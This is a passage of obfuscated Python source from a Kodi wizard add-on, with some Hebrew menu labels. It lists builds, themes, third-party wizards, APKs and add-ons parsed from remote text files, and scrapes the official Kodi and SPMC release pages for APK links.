	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0OO000000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OO0OO0OOOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	setView ('files','viewType')#line:2195
def buildMenu ():#line:2197
	if USERNAME =='':#line:2198
		ADDON .openSettings ()#line:2199
		sys .exit ()#line:2200
	if PASSWORD =='':#line:2201
		ADDON .openSettings ()#line:2202
	O00O0O000O0OO0OO0 =(SPEEDFILE )#line:2203
	(O00O0O000O0OO0OO0 )#line:2204
	O0O00OOOO0O0OO0O0 =(wiz .workingURL (O00O0O000O0OO0OO0 ))#line:2205
	(O0O00OOOO0O0OO0O0 )#line:2206
	O0O00OOOO0O0OO0O0 =wiz .workingURL (SPEEDFILE )#line:2207
	if not O0O00OOOO0O0OO0O0 ==True :#line:2208
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2209
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2210
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2211
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addFile ('%s'%O0O00OOOO0O0OO0O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2213
	else :#line:2214
		O0OO0000000O0OO0O ,OOO00OOOO0O0OOOO0 ,O00000O0OO0OOOO0O ,O000000OO00O00O00 ,O0OO000O0O00O0OOO ,O0O0OO0OOO00OOO00 ,OO0OOO0OOO00OOO0O =wiz .buildCount ()#line:2215
		O00O00O0O0000OO00 =False ;O00OO00O00OO0000O =[]#line:2216
		if THIRDPARTY =='true':#line:2217
			if not THIRD1NAME ==''and not THIRD1URL =='':O00O00O0O0000OO00 =True ;O00OO00O00OO0000O .append ('1')#line:2218
			if not THIRD2NAME ==''and not THIRD2URL =='':O00O00O0O0000OO00 =True ;O00OO00O00OO0000O .append ('2')#line:2219
			if not THIRD3NAME ==''and not THIRD3URL =='':O00O00O0O0000OO00 =True ;O00OO00O00OO0000O .append ('3')#line:2220
		O00O0OOO00OO00OO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2221
		OOO000OO000000OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0OOO00OO00OO0 )#line:2222
		if O0OO0000000O0OO0O ==1 and O00O00O0O0000OO00 ==False :#line:2223
			for OO0000O0O0O00000O ,O00O00OO00O000000 ,O0000O000O0O00O0O ,OOO0000000OOOO00O ,OO0000O00OOOOOO0O ,OO00O000O00OOOOOO ,O0000OOOOOOOO0OOO ,O0OO0O00O0OOOO00O ,O0O00000OOO00OOO0 ,O0O000OO0OO0OOO0O in OOO000OO000000OOO :#line:2224
				if not SHOWADULT =='true'and O0O00000OOO00OOO0 .lower ()=='yes':continue #line:2225
				if not DEVELOPER =='true'and wiz .strTest (OO0000O0O0O00000O ):continue #line:2226
				viewBuild (OOO000OO000000OOO [0 ][0 ])#line:2227
				return #line:2228
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2231
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2232
		if O00O00O0O0000OO00 ==True :#line:2233
			for OOOO0OOO0O0O0OOOO in O00OO00O00OO0000O :#line:2234
				OO0000O0O0O00000O =eval ('THIRD%sNAME'%OOOO0OOO0O0O0OOOO )#line:2235
		if len (OOO000OO000000OOO )>=1 :#line:2237
			if SEPERATE =='true':#line:2238
				for OO0000O0O0O00000O ,O00O00OO00O000000 ,O0000O000O0O00O0O ,OOO0000000OOOO00O ,OO0000O00OOOOOO0O ,OO00O000O00OOOOOO ,O0000OOOOOOOO0OOO ,O0OO0O00O0OOOO00O ,O0O00000OOO00OOO0 ,O0O000OO0OO0OOO0O in OOO000OO000000OOO :#line:2239
					if not SHOWADULT =='true'and O0O00000OOO00OOO0 .lower ()=='yes':continue #line:2240
					if not DEVELOPER =='true'and wiz .strTest (OO0000O0O0O00000O ):continue #line:2241
					O0OO000O0O0O0OOO0 =createMenu ('install','',OO0000O0O0O00000O )#line:2242
					addDir ('[%s] %s (v%s)'%(float (OO0000O00OOOOOO0O ),OO0000O0O0O00000O ,O00O00OO00O000000 ),'viewbuild',OO0000O0O0O00000O ,description =O0O000OO0OO0OOO0O ,fanart =O0OO0O00O0OOOO00O ,icon =O0000OOOOOOOO0OOO ,menu =O0OO000O0O0O0OOO0 ,themeit =THEME2 )#line:2243
			else :#line:2244
				if O000000OO00O00O00 >0 :#line:2245
					OO00O0O00O0OO0OOO ='+'if SHOW17 =='false'else '-'#line:2246
					if SHOW17 =='true':#line:2248
						for OO0000O0O0O00000O ,O00O00OO00O000000 ,O0000O000O0O00O0O ,OOO0000000OOOO00O ,OO0000O00OOOOOO0O ,OO00O000O00OOOOOO ,O0000OOOOOOOO0OOO ,O0OO0O00O0OOOO00O ,O0O00000OOO00OOO0 ,O0O000OO0OO0OOO0O in OOO000OO000000OOO :#line:2250
							if not SHOWADULT =='true'and O0O00000OOO00OOO0 .lower ()=='yes':continue #line:2251
							if not DEVELOPER =='true'and wiz .strTest (OO0000O0O0O00000O ):continue #line:2252
							OOO00000O00O0OOOO =int (float (OO0000O00OOOOOO0O ))#line:2253
							if OOO00000O00O0OOOO ==17 :#line:2254
								O0OO000O0O0O0OOO0 =createMenu ('install','',OO0000O0O0O00000O )#line:2255
								addDir ('[%s] %s (v%s)'%(float (OO0000O00OOOOOO0O ),OO0000O0O0O00000O ,O00O00OO00O000000 ),'viewbuild',OO0000O0O0O00000O ,description =O0O000OO0OO0OOO0O ,fanart =O0OO0O00O0OOOO00O ,icon =O0000OOOOOOOO0OOO ,menu =O0OO000O0O0O0OOO0 ,themeit =THEME2 )#line:2256
				if O0OO000O0O00O0OOO >0 :#line:2257
					OO00O0O00O0OO0OOO ='+'if SHOW18 =='false'else '-'#line:2258
					if SHOW18 =='true':#line:2260
						for OO0000O0O0O00000O ,O00O00OO00O000000 ,O0000O000O0O00O0O ,OOO0000000OOOO00O ,OO0000O00OOOOOO0O ,OO00O000O00OOOOOO ,O0000OOOOOOOO0OOO ,O0OO0O00O0OOOO00O ,O0O00000OOO00OOO0 ,O0O000OO0OO0OOO0O in OOO000OO000000OOO :#line:2262
							if not SHOWADULT =='true'and O0O00000OOO00OOO0 .lower ()=='yes':continue #line:2263
							if not DEVELOPER =='true'and wiz .strTest (OO0000O0O0O00000O ):continue #line:2264
							OOO00000O00O0OOOO =int (float (OO0000O00OOOOOO0O ))#line:2265
							if OOO00000O00O0OOOO ==18 :#line:2266
								O0OO000O0O0O0OOO0 =createMenu ('install','',OO0000O0O0O00000O )#line:2267
								addDir ('[%s] %s (v%s)'%(float (OO0000O00OOOOOO0O ),OO0000O0O0O00000O ,O00O00OO00O000000 ),'viewbuild',OO0000O0O0O00000O ,description =O0O000OO0OO0OOO0O ,fanart =O0OO0O00O0OOOO00O ,icon =O0000OOOOOOOO0OOO ,menu =O0OO000O0O0O0OOO0 ,themeit =THEME2 )#line:2268
				if O00000O0OO0OOOO0O >0 :#line:2269
					OO00O0O00O0OO0OOO ='+'if SHOW16 =='false'else '-'#line:2270
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO00O0O00O0OO0OOO ,O00000O0OO0OOOO0O ),'togglesetting','show16',themeit =THEME3 )#line:2271
					if SHOW16 =='true':#line:2272
						for OO0000O0O0O00000O ,O00O00OO00O000000 ,O0000O000O0O00O0O ,OOO0000000OOOO00O ,OO0000O00OOOOOO0O ,OO00O000O00OOOOOO ,O0000OOOOOOOO0OOO ,O0OO0O00O0OOOO00O ,O0O00000OOO00OOO0 ,O0O000OO0OO0OOO0O in OOO000OO000000OOO :#line:2273
							if not SHOWADULT =='true'and O0O00000OOO00OOO0 .lower ()=='yes':continue #line:2274
							if not DEVELOPER =='true'and wiz .strTest (OO0000O0O0O00000O ):continue #line:2275
							OOO00000O00O0OOOO =int (float (OO0000O00OOOOOO0O ))#line:2276
							if OOO00000O00O0OOOO ==16 :#line:2277
								O0OO000O0O0O0OOO0 =createMenu ('install','',OO0000O0O0O00000O )#line:2278
								addDir ('[%s] %s (v%s)'%(float (OO0000O00OOOOOO0O ),OO0000O0O0O00000O ,O00O00OO00O000000 ),'viewbuild',OO0000O0O0O00000O ,description =O0O000OO0OO0OOO0O ,fanart =O0OO0O00O0OOOO00O ,icon =O0000OOOOOOOO0OOO ,menu =O0OO000O0O0O0OOO0 ,themeit =THEME2 )#line:2279
				if OOO00OOOO0O0OOOO0 >0 :#line:2280
					OO00O0O00O0OO0OOO ='+'if SHOW15 =='false'else '-'#line:2281
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO00O0O00O0OO0OOO ,OOO00OOOO0O0OOOO0 ),'togglesetting','show15',themeit =THEME3 )#line:2282
					if SHOW15 =='true':#line:2283
						for OO0000O0O0O00000O ,O00O00OO00O000000 ,O0000O000O0O00O0O ,OOO0000000OOOO00O ,OO0000O00OOOOOO0O ,OO00O000O00OOOOOO ,O0000OOOOOOOO0OOO ,O0OO0O00O0OOOO00O ,O0O00000OOO00OOO0 ,O0O000OO0OO0OOO0O in OOO000OO000000OOO :#line:2284
							if not SHOWADULT =='true'and O0O00000OOO00OOO0 .lower ()=='yes':continue #line:2285
							if not DEVELOPER =='true'and wiz .strTest (OO0000O0O0O00000O ):continue #line:2286
							OOO00000O00O0OOOO =int (float (OO0000O00OOOOOO0O ))#line:2287
							if OOO00000O00O0OOOO <=15 :#line:2288
								O0OO000O0O0O0OOO0 =createMenu ('install','',OO0000O0O0O00000O )#line:2289
								addDir ('[%s] %s (v%s)'%(float (OO0000O00OOOOOO0O ),OO0000O0O0O00000O ,O00O00OO00O000000 ),'viewbuild',OO0000O0O0O00000O ,description =O0O000OO0OO0OOO0O ,fanart =O0OO0O00O0OOOO00O ,icon =O0000OOOOOOOO0OOO ,menu =O0OO000O0O0O0OOO0 ,themeit =THEME2 )#line:2290
		elif OO0OOO0OOO00OOO0O >0 :#line:2291
			if O0O0OO0OOO00OOO00 >0 :#line:2292
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2293
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2294
			else :#line:2295
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
	setView ('files','viewType')#line:2298
def viewBuild (OOOOO0O00000O0O00 ):#line:2300
	OOO00O000000000OO =wiz .workingURL (SPEEDFILE )#line:2301
	if not OOO00O000000000OO ==True :#line:2302
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2303
		addFile ('%s'%OOO00O000000000OO ,'',themeit =THEME3 )#line:2304
		return #line:2305
	if wiz .checkBuild (OOOOO0O00000O0O00 ,'version')==False :#line:2306
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2307
		addFile ('%s was not found in the builds list.'%OOOOO0O00000O0O00 ,'',themeit =THEME3 )#line:2308
		return #line:2309
	O0OO0O0O00OO0000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2310
	O00OOOO0O00000OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOO0O00000O0O00 ).findall (O0OO0O0O00OO0000O )#line:2311
	for OOOO000OO00OOO000 ,OOO0O0OOOO0OOOO00 ,OO0O000OOOO00O00O ,O0OOO0O0O0O0000OO ,O000OOOOO000O0O0O ,O00O00000O00000OO ,OO0OOOO0O00OOOOOO ,O0OOOO0O0O0OO00OO ,OOOOOOOO00000OOO0 ,OOOOOO00OOOO0O0OO in O00OOOO0O00000OO0 :#line:2312
		O00O00000O00000OO =O00O00000O00000OO if wiz .workingURL (O00O00000O00000OO )else ICON #line:2313
		OO0OOOO0O00OOOOOO =OO0OOOO0O00OOOOOO if wiz .workingURL (OO0OOOO0O00OOOOOO )else FANART #line:2314
		OO0OOOOOO0000OO0O ='%s (v%s)'%(OOOOO0O00000O0O00 ,OOOO000OO00OOO000 )#line:2315
		if BUILDNAME ==OOOOO0O00000O0O00 and OOOO000OO00OOO000 >BUILDVERSION :#line:2316
			OO0OOOOOO0000OO0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0OOOOOO0000OO0O ,BUILDVERSION )#line:2317
		OOO0O0O00OO000000 =int (float (KODIV ));OOO0000OOOOO0OO0O =int (float (O0OOO0O0O0O0000OO ))#line:2326
		if not OOO0O0O00OO000000 ==OOO0000OOOOO0OO0O :#line:2327
			if OOO0O0O00OO000000 ==16 and OOO0000OOOOO0OO0O <=15 :O0OO00O00OO0OO0OO =False #line:2328
			else :O0OO00O00OO0OO0OO =True #line:2329
		else :O0OO00O00OO0OO0OO =False #line:2330
		addFile ('התקנה','install',OOOOO0O00000O0O00 ,'fresh',description =OOOOOO00OOOO0O0OO ,fanart =OO0OOOO0O00OOOOOO ,icon =O00O00000O00000OO ,themeit =THEME1 )#line:2334
		if not O000OOOOO000O0O0O =='http://':#line:2337
			if wiz .workingURL (O000OOOOO000O0O0O )==True :#line:2338
				addFile (wiz .sep ('THEMES'),'',fanart =OO0OOOO0O00OOOOOO ,icon =O00O00000O00000OO ,themeit =THEME3 )#line:2339
				O0OO0O0O00OO0000O =wiz .openURL (O000OOOOO000O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2340
				O00OOOO0O00000OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O0O00OO0000O )#line:2341
				for OO0OOO0OO0OO0OO00 ,OO0OO000OO0OOOO0O ,O0O0OO00OO000OOO0 ,OO00OO0OOO000O000 ,OO0OOOO00OO0OOOO0 ,OOOOOO00OOOO0O0OO in O00OOOO0O00000OO0 :#line:2342
					if not SHOWADULT =='true'and OO0OOOO00OO0OOOO0 .lower ()=='yes':continue #line:2343
					O0O0OO00OO000OOO0 =O0O0OO00OO000OOO0 if O0O0OO00OO000OOO0 =='http://'else O00O00000O00000OO #line:2344
					OO00OO0OOO000O000 =OO00OO0OOO000O000 if OO00OO0OOO000O000 =='http://'else OO0OOOO0O00OOOOOO #line:2345
					addFile (OO0OOO0OO0OO0OO00 if not OO0OOO0OO0OO0OO00 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0OOO0OO0OO0OO00 ,'theme',OOOOO0O00000O0O00 ,OO0OOO0OO0OO0OO00 ,description =OOOOOO00OOOO0O0OO ,fanart =OO00OO0OOO000O000 ,icon =O0O0OO00OO000OOO0 ,themeit =THEME3 )#line:2346
	setView ('files','viewType')#line:2347
def viewThirdList (O0OOOO00OOOOO0O0O ):#line:2349
	OO0OOOOOO0OOO00OO =eval ('THIRD%sNAME'%O0OOOO00OOOOO0O0O )#line:2350
	O00O0OOO00OO0OOOO =eval ('THIRD%sURL'%O0OOOO00OOOOO0O0O )#line:2351
	O0O0OO0000OOO00O0 =wiz .workingURL (O00O0OOO00OO0OOOO )#line:2352
	if not O0O0OO0000OOO00O0 ==True :#line:2353
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2354
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2355
	else :#line:2356
		OO0000O0OO00O0OO0 ,OOOOOOOOO0OOOO000 =wiz .thirdParty (O00O0OOO00OO0OOOO )#line:2357
		addFile ("[B]%s[/B]"%OO0OOOOOO0OOO00OO ,'',themeit =THEME3 )#line:2358
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2359
		if OO0000O0OO00O0OO0 :#line:2360
			for OO0OOOOOO0OOO00OO ,OO00000000O00O00O ,O00O0OOO00OO0OOOO ,O00OOOOO0000OOOOO ,O0000O000OOO00O0O ,O0OOO0OO0OO00OOO0 ,O0O0O0OOO0000OOOO ,O00O0O00OO000OOOO in OOOOOOOOO0OOOO000 :#line:2361
				if not SHOWADULT =='true'and O0O0O0OOO0000OOOO .lower ()=='yes':continue #line:2362
				addFile ("[%s] %s v%s"%(O00OOOOO0000OOOOO ,OO0OOOOOO0OOO00OO ,OO00000000O00O00O ),'installthird',OO0OOOOOO0OOO00OO ,O00O0OOO00OO0OOOO ,icon =O0000O000OOO00O0O ,fanart =O0OOO0OO0OO00OOO0 ,description =O00O0O00OO000OOOO ,themeit =THEME2 )#line:2363
		else :#line:2364
			for OO0OOOOOO0OOO00OO ,O00O0OOO00OO0OOOO ,O0000O000OOO00O0O ,O0OOO0OO0OO00OOO0 ,O00O0O00OO000OOOO in OOOOOOOOO0OOOO000 :#line:2365
				addFile (OO0OOOOOO0OOO00OO ,'installthird',OO0OOOOOO0OOO00OO ,O00O0OOO00OO0OOOO ,icon =O0000O000OOO00O0O ,fanart =O0OOO0OO0OO00OOO0 ,description =O00O0O00OO000OOOO ,themeit =THEME2 )#line:2366
def editThirdParty (O0OOOO0O0O000OO0O ):#line:2368
	OO00O000OOO0O0OO0 =eval ('THIRD%sNAME'%O0OOOO0O0O000OO0O )#line:2369
	O00OO00OOOO0OO00O =eval ('THIRD%sURL'%O0OOOO0O0O000OO0O )#line:2370
	OO0O0OO0O0O00O000 =wiz .getKeyboard (OO00O000OOO0O0OO0 ,'Enter the Name of the Wizard')#line:2371
	O0000OOO0000O0OOO =wiz .getKeyboard (O00OO00OOOO0OO00O ,'Enter the URL of the Wizard Text')#line:2372
	wiz .setS ('wizard%sname'%O0OOOO0O0O000OO0O ,OO0O0OO0O0O00O000 )#line:2374
	wiz .setS ('wizard%surl'%O0OOOO0O0O000OO0O ,O0000OOO0000O0OOO )#line:2375
def apkScraper (name =""):#line:2377
	if name =='kodi':#line:2378
		O0OOOOOO00O0000OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2379
		O0O0OO0O0OO0OOO0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2380
		O0000OOO00O000OOO =wiz .openURL (O0OOOOOO00O0000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2381
		OOOO0OO0O0O0OOO00 =wiz .openURL (O0O0OO0O0OO0OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2382
		O000O0OO0OOO0OOOO =0 #line:2383
		OO0O0OOOOO00O0000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0000OOO00O000OOO )#line:2384
		O0O00000OOO0OO0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO0OO0O0O0OOO00 )#line:2385
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2387
		OOO0O00O000OO0O00 =False #line:2388
		for OOOOO000OOO0OOO0O ,name ,O000OOOOOOO000OO0 ,OOO00O00OO0OO0OO0 in OO0O0OOOOO00O0000 :#line:2389
			if OOOOO000OOO0OOO0O in ['../','old/']:continue #line:2390
			if not OOOOO000OOO0OOO0O .endswith ('.apk'):continue #line:2391
			if not OOOOO000OOO0OOO0O .find ('_')==-1 and OOO0O00O000OO0O00 ==True :continue #line:2392
			try :#line:2393
				O00OOO0OO000OO0O0 =name .split ('-')#line:2394
				if not OOOOO000OOO0OOO0O .find ('_')==-1 :#line:2395
					OOO0O00O000OO0O00 =True #line:2396
					O000O000O0O00OO00 ,OO000O0OOO0O0O0OO =O00OOO0OO000OO0O0 [2 ].split ('_')#line:2397
				else :#line:2398
					O000O000O0O00OO00 =O00OOO0OO000OO0O0 [2 ]#line:2399
					OO000O0OOO0O0O0OO =''#line:2400
				OOO0000O00O000OO0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO0OO000OO0O0 [0 ].title (),O00OOO0OO000OO0O0 [1 ],OO000O0OOO0O0O0OO .upper (),O000O000O0O00OO00 ,COLOR2 ,O000OOOOOOO000OO0 .replace (' ',''),COLOR1 ,OOO00O00OO0OO0OO0 )#line:2401
				OO0OOO0000OO0O0O0 =urljoin (O0OOOOOO00O0000OO ,OOOOO000OOO0OOO0O )#line:2402
				addFile (OOO0000O00O000OO0 ,'apkinstall',"%s v%s%s %s"%(O00OOO0OO000OO0O0 [0 ].title (),O00OOO0OO000OO0O0 [1 ],OO000O0OOO0O0O0OO .upper (),O000O000O0O00OO00 ),OO0OOO0000OO0O0O0 )#line:2403
				O000O0OO0OOO0OOOO +=1 #line:2404
			except :#line:2405
				wiz .log ("Error on: %s"%name )#line:2406
		for OOOOO000OOO0OOO0O ,name ,O000OOOOOOO000OO0 ,OOO00O00OO0OO0OO0 in O0O00000OOO0OO0O0 :#line:2408
			if OOOOO000OOO0OOO0O in ['../','old/']:continue #line:2409
			if not OOOOO000OOO0OOO0O .endswith ('.apk'):continue #line:2410
			if not OOOOO000OOO0OOO0O .find ('_')==-1 :continue #line:2411
			try :#line:2412
				O00OOO0OO000OO0O0 =name .split ('-')#line:2413
				OOO0000O00O000OO0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO0OO000OO0O0 [0 ].title (),O00OOO0OO000OO0O0 [1 ],O00OOO0OO000OO0O0 [2 ],COLOR2 ,O000OOOOOOO000OO0 .replace (' ',''),COLOR1 ,OOO00O00OO0OO0OO0 )#line:2414
				OO0OOO0000OO0O0O0 =urljoin (O0O0OO0O0OO0OOO0O ,OOOOO000OOO0OOO0O )#line:2415
				addFile (OOO0000O00O000OO0 ,'apkinstall',"%s v%s %s"%(O00OOO0OO000OO0O0 [0 ].title (),O00OOO0OO000OO0O0 [1 ],O00OOO0OO000OO0O0 [2 ]),OO0OOO0000OO0O0O0 )#line:2416
				O000O0OO0OOO0OOOO +=1 #line:2417
			except :#line:2418
				wiz .log ("Error on: %s"%name )#line:2419
		if O000O0OO0OOO0OOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2420
	elif name =='spmc':#line:2421
		OOO000OOOOO0000O0 ='https://github.com/koying/SPMC/releases'#line:2422
		O0000OOO00O000OOO =wiz .openURL (OOO000OOOOO0000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2423
		O000O0OO0OOO0OOOO =0 #line:2424
		OO0O0OOOOO00O0000 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0000OOO00O000OOO )#line:2425
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2427
		for name ,OO000O000O00O00O0 in OO0O0OOOOO00O0000 :#line:2429
			OO0O0O0O0O0O00OO0 =''#line:2430
			O0O00000OOO0OO0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO000O000O00O00O0 )#line:2431
			for OO000O0OO00OOOOOO ,OOOOOO0O0O00OOOOO ,O0O0O0OO0OOO0O0O0 in O0O00000OOO0OO0O0 :#line:2432
				if O0O0O0OO0OOO0O0O0 .find ('armeabi')==-1 :continue #line:2433
				if O0O0O0OO0OOO0O0O0 .find ('launcher')>-1 :continue #line:2434
				OO0O0O0O0O0O00OO0 =urljoin ('https://github.com',OO000O0OO00OOOOOO )#line:2435
				break #line:2436
		if O000O0OO0OOO0OOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2438
def apkMenu (url =None ):#line:2440
	if url ==None :#line:2441
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2444
	if not APKFILE =='http://':#line:2445
		if url ==None :#line:2446
			O00O000OO00O00O0O =wiz .workingURL (APKFILE )#line:2447
			OOO0OOOO00OO0O000 =uservar .APKFILE #line:2448
		else :#line:2449
			O00O000OO00O00O0O =wiz .workingURL (url )#line:2450
			OOO0OOOO00OO0O000 =url #line:2451
		if O00O000OO00O00O0O ==True :#line:2452
			OOO000O0OOO0O0O0O =wiz .openURL (OOO0OOOO00OO0O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2453
			O00OOOOOO0O0OO0OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO000O0OOO0O0O0O )#line:2454
			if len (O00OOOOOO0O0OO0OO )>0 :#line:2455
				O0OOOO00000O0O0OO =0 #line:2456
				for O00O0OO0O00OOOO00 ,OO0000OOOO0OO0OOO ,url ,OO0000O0000OO0O00 ,OO0OO0O000OO000O0 ,O0OOOO0O00O0OOOO0 ,OOOOOO0O0OO00OO0O in O00OOOOOO0O0OO0OO :#line:2457
					if not SHOWADULT =='true'and O0OOOO0O00O0OOOO0 .lower ()=='yes':continue #line:2458
					if OO0000OOOO0OO0OOO .lower ()=='yes':#line:2459
						O0OOOO00000O0O0OO +=1 #line:2460
						addDir ("[B]%s[/B]"%O00O0OO0O00OOOO00 ,'apk',url ,description =OOOOOO0O0OO00OO0O ,icon =OO0000O0000OO0O00 ,fanart =OO0OO0O000OO000O0 ,themeit =THEME3 )#line:2461
					else :#line:2462
						O0OOOO00000O0O0OO +=1 #line:2463
						addFile (O00O0OO0O00OOOO00 ,'apkinstall',O00O0OO0O00OOOO00 ,url ,description =OOOOOO0O0OO00OO0O ,icon =OO0000O0000OO0O00 ,fanart =OO0OO0O000OO000O0 ,themeit =THEME2 )#line:2464
					if O0OOOO00000O0O0OO <1 :#line:2465
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2466
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2467
		else :#line:2468
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2469
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2470
			addFile ('%s'%O00O000OO00O00O0O ,'',themeit =THEME3 )#line:2471
		return #line:2472
	else :wiz .log ("[APK Menu] No APK list added.")#line:2473
	setView ('files','viewType')#line:2474
def addonMenu (url =None ):#line:2476
	if not ADDONFILE =='http://':#line:2477
		if url ==None :#line:2478
			O0O0OOOOOOOOO0OO0 =wiz .workingURL (ADDONFILE )#line:2479
			O0O0OOO0OO0O00O0O =uservar .ADDONFILE #line:2480
		else :#line:2481
			O0O0OOOOOOOOO0OO0 =wiz .workingURL (url )#line:2482
			O0O0OOO0OO0O00O0O =url #line:2483
		if O0O0OOOOOOOOO0OO0 ==True :#line:2484
			O0OOOO00OOO0OO00O =wiz .openURL (O0O0OOO0OO0O00O0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2485
			O000OOO00OOO0OO0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOO00OOO0OO00O )#line:2486
			if len (O000OOO00OOO0OO0O )>0 :#line:2487
				O000OOO0OO000OO0O =0 #line:2488
				for O00O0O0O0O00O0OO0 ,OO00000O0OO0O00OO ,url ,OOO0O0O00000O0O00 ,OOO0O000OOOOO00O0 ,O000O000O0O0O0OOO ,OO0OO0OOO0OO000O0 ,OOO0O0O0OO0O00O00 ,O000OO00O000O0O00 ,OO00O0O0OOO0OO0O0 in O000OOO00OOO0OO0O :#line:2489
					if OO00000O0OO0O00OO .lower ()=='section':#line:2490
						O000OOO0OO000OO0O +=1 #line:2491
						addDir ("[B]%s[/B]"%O00O0O0O0O00O0OO0 ,'addons',url ,description =OO00O0O0OOO0OO0O0 ,icon =OO0OO0OOO0OO000O0 ,fanart =OOO0O0O0OO0O00O00 ,themeit =THEME3 )#line:2492
					else :#line:2493
						if not SHOWADULT =='true'and O000OO00O000O0O00 .lower ()=='yes':continue #line:2494
						try :#line:2495
							OOO00O0OOO000O0OO =xbmcaddon .Addon (id =OO00000O0OO0O00OO ).getAddonInfo ('path')#line:2496
							if os .path .exists (OOO00O0OOO000O0OO ):#line:2497
								O00O0O0O0O00O0OO0 ="[COLOR green][Installed][/COLOR] %s"%O00O0O0O0O00O0OO0 #line:2498
						except :#line:2499
							pass #line:2500
						O000OOO0OO000OO0O +=1 #line:2501
